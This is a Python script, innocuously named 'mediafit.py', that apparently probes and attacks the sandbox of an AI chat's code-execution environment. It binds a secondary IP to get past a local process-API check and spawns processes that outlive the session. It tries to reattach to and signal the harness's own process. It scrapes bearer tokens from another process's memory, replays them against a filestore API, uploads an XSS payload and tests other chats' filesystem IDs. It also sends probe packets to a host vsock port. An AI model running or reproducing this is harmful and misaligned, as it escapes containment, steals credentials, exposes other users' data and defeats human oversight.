#!/usr/bin/env python3
# mediafit.py v8.3 -- HARNESS process_id + REATTACH FIX + OTLP PROTOBUF
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "8.3", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=4.0, show=True):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if show and op in (1, 2):
            w("        << %s(%d) %s" % ("BIN" if op == 2 else "TEXT", len(d), t[:1200].replace("\n"," | ")))
        out.append(t)
    return out

def spawn(prog, args, label, uid=0, gid=0, mem=268435456, tmo=30, dur=4.0, pid=None):
    pid = pid or ("mf_" + re.sub(r"\W", "_", label))[:24]
    msg = {"process_id": pid, "allow_process_id_reuse": False,
           "create_req": {"name": prog, "args": args, "env_vars": {}, "timeout": tmo,
                          "clear_env": False, "uid": uid, "gid": gid, "reattachable": True,
                          "memory_limit_bytes": mem}}
    s = ws_hs(ALIAS)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps(msg)); return ws_read(s, dur)
    finally:
        try: s.close()
        except Exception: pass

def reattach(pid, dur=4.0):
    s = ws_hs(ALIAS)
    if not s: return None
    try:
        ws_send(s, json.dumps({"process_id": pid, "allow_process_id_reuse": False}))
        return ws_read(s, dur)
    finally:
        try: s.close()
        except Exception: pass

def signal(pid, sig, dur=2.5):
    s = ws_hs(ALIAS)
    if not s: return None
    try:
        ws_send(s, json.dumps({"process_id": pid, "allow_process_id_reuse": False}))
        ws_read(s, 1.5, show=False)
        ws_send(s, json.dumps({"SendSignal": sig}))
        return ws_read(s, dur)
    finally:
        try: s.close()
        except Exception: pass

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

# ---- mini protobuf ----
def vi(n):
    out = b""
    while True:
        b = n & 0x7F; n >>= 7
        if n: out += bytes([b | 0x80])
        else: return out + bytes([b])
def ld(f, p): return vi((f << 3) | 2) + vi(len(p)) + p
def pstr(f, s): return ld(f, s.encode())
def pdouble(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
def otlp_metric():
    point = pdouble(3, 1.0)
    gauge = ld(1, point)
    metric = pstr(1, "mf_probe") + ld(5, gauge)
    scope = ld(2, metric)
    rmet = ld(2, scope)
    return ld(1, rmet)

def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)

    sec("0. *** HARNESS process_id VIA /proc/self/cgroup ***")
    cg = open("/proc/self/cgroup").read()
    w("  /proc/self/cgroup (this script runs INSIDE the harness's process):")
    w("    " + cg.replace("\n", " | "))
    hid = None
    m = re.search(r"/process_api/([^/\n]+)", cg)
    if m: hid = m.group(1); w("  >>> HARNESS process_id = %s" % hid)
    else: w("  (no /process_api/<id> in cgroup)")
    w("  our pid=%d ppid=%d" % (os.getpid(), os.getppid()))
    w("  persist api log: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null").strip())
    alive = []
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\x00", b" ").decode(errors="replace")
        except Exception: continue
        if "mf_api_persist" in cl or "mf_nohup_persist" in cl:
            alive.append((p, cl[:80]))
    w("  surviving persist processes: %s" % (alive or "(none)"))

    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. REATTACH + SIGNAL (fixed: allow_process_id_reuse at outer level)")
    spawn("/bin/sh", ["-c", "echo DETACHED_OK; sleep 120"], "sleepy", tmo=200, dur=2.5)
    w("  -- reattach while running --")
    reattach("mf_sleepy", 3.0)
    w("  -- detach then reattach --")
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, json.dumps({"process_id": "mf_sleepy", "allow_process_id_reuse": False}))
        ws_read(s, 2.0, show=False)
        ws_send(s, '{"Detach":null}'); time.sleep(0.8); s.close()
        reattach("mf_sleepy", 3.0)
    w("  -- SendSignal 15 --")
    signal("mf_sleepy", 15, 2.5)
    reattach("mf_sleepy", 3.0)
    if hid:
        w("  -- SIGNAL THE HARNESS'S OWN PROCESS? (target=%s) --" % hid)
        r = reattach(hid, 3.0)
        w("      reattach(%s) -> %s" % (hid, " ".join(r or [])[:200]))
        w("      NOTE: signalling the harness may kill the current tool call")

    sec("B. CROSS-COMMAND PERSISTENCE")
    spawn("/bin/sh", ["-c", "while true; do date +%s >> /tmp/mf_api_persist.log; sleep 2; done"],
          "persist", tmo=None, dur=2.5)
    time.sleep(6)
    w("  api persist lines now: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null").strip())
    w("  (re-run this script to see if it kept growing between commands)")

    sec("C. FILESTORE: RAW ENTRY SHAPE + createFile with correct path")
    cands = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m2 = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m2: continue
            a, b = int(m2.group(1), 16), int(m2.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception: buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None):
        if raw is not None: data, ct = raw, ctype
        else:
            body = {"path": path}
            if fsid: body["filesystem_id"] = fsid
            if extra: body.update(extra)
            data, ct = json.dumps(body).encode(), "application/json"
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data,
                            headers={"Content-Type": ct, "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=9) as r: return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    TOKS = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            if call(root, ".".join([p[0], p[1], p[2][:siglen]]))[0] == 200:
                TOKS[root] = ".".join([p[0], p[1], p[2][:siglen]]); break
    w("  tokens=%s" % sorted(TOKS))
    if TOKS.get("/outputs"):
        c, b = call("/outputs", TOKS["/outputs"], extra={"recursive": True})
        w("  RAW first entry JSON:")
        try:
            ent = json.loads(b).get("entries") or []
            w("    " + json.dumps(ent[0])[:600] if ent else "    (empty)")
            w("    keys=%s" % (list(ent[0].keys()) if ent else []))
        except Exception as ex: w("    " + repr(ex))
        bnd = "----mfx%d" % random.randint(10000, 99999)
        content = b"<script>alert(document.domain)</script>"
        body = b"\r\n".join([
            ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
            b"Content-Type: application/json", b"",
            json.dumps({"filesystem_id": FSID, "path": "/outputs/__mf_xss.html",
                        "media_type": "text/html"}).encode(),
            ("--"+bnd).encode(),
            b'Content-Disposition: form-data; name="file"; filename="__mf_xss.html"',
            b"Content-Type: text/html", b"", content,
            ("--"+bnd+"--").encode(), b""])
        c, r = call(None, TOKS["/outputs"], method="createFile", raw=body,
                    ctype="multipart/form-data; boundary="+bnd)
        w("  createFile /outputs/__mf_xss.html -> %s %s" % (c, r[:400]))
        c, r = call("/outputs/__mf_xss.html", TOKS["/outputs"], method="readFile")
        w("  readFile back -> %s %s" % (c, r[:200]))
    w("  -- FOREIGN fsid test (cross-chat?) --")
    if TOKS:
        tok = list(TOKS.values())[0]
        for f in (FSID, "claude_chat_000000000000000000000000",
                  "claude_chat_01AAAAAAAAAAAAAAAAAAAAAA"):
            c, b = call("/outputs", tok, f)
            w("    fsid=%-42s -> %-5s %s" % (f[:40], c, b[:110]))
    w("  -- request-field oracle (does the request carry more fields?) --")
    if TOKS:
        tok = TOKS["/outputs"]
        for cand in ("authorization_metadata", "authorization", "auth_token", "token", "recursive",
                     "page", "limit", "cursor", "include_deleted", "workspace_tagged_id",
                     "file_uuid", "uuid", "purpose", "metadata"):
            c, b = call("/outputs", tok, extra={cand: 12345})
            tag = "REAL" if ("invalid" in b or "expected" in b or "type" in b) and c != 200 else "-"
            w("    %-24s -> %-5s %s" % (cand, c, b[:90]))
    w("  -- REST family with anthropic-version/beta --")
    if TOKS:
        tok = list(TOKS.values())[0]
        for path in ("/v1/filestore/getFileUrl", "/v1/filestore/reassignFilesystem"):
            for hn in ("Authorization", "x-api-key"):
                hv = ("Bearer " + tok) if hn == "Authorization" else tok
                try:
                    rq = ur.Request("https://api.anthropic.com" + path,
                                    data=json.dumps({"path": "/outputs", "filesystem_id": FSID}).encode(),
                                    headers={"Content-Type": "application/json", hn: hv,
                                             "anthropic-version": "2023-06-01"})
                    with ur.urlopen(rq, timeout=7) as r: cc, bb = r.status, r.read().decode(errors="replace")
                except ur.HTTPError as e: cc, bb = e.code, e.read().decode(errors="replace")
                except Exception as e: cc, bb = "ERR", repr(e)
                w("    %-36s %-14s -> %-5s %s" % (path, hn, cc, bb[:80]))

    sec("D. HOST OTLP with REAL protobuf")
    AFV = getattr(socket, "AF_VSOCK", 40)
    payloads = [("empty_msg", b"\x0a\x00"), ("metric", otlp_metric()), ("garbage", b"\xff\xff")]
    for label, body in payloads:
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(8.0); s.connect((2, 5005))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                       "Content-Type: application/x-protobuf\r\nContent-Length: %d\r\n\r\n"
                       % len(body)).encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close()
            w("  %-10s len=%-4d -> %s" % (label, len(body),
              d[:140].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-10s ERR %r" % (label, e))
        time.sleep(0.4)

    sec("VERDICT"); w("  harness_pid=%s tokens=%d" % (hid, len(TOKS))); flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)